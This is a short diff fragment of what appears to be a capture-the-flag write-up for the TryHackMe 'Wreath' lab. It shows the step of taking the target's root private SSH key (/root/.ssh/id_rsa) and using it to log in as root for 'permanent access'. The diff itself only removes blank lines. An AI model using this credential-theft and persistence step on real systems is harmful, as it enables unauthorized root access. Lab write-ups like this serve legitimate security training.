@@ -42,10 +42,8 @@ download /root/.ssh/id_rsa to get pernament access via ssh
 
 ┌──(duke㉿kali)-[~/Documents/THM_Wreath]
 └─$ cp id_rsa root                        
-                                                                                                                    
 ┌──(duke㉿kali)-[~/Documents/THM_Wreath]
 └─$ chmod +600 root 
-
 ┌──(duke㉿kali)-[~/Documents/THM_Wreath]
 └─$ ssh -i root root@10.200.85.200
 [root@prod-serv ~]# id
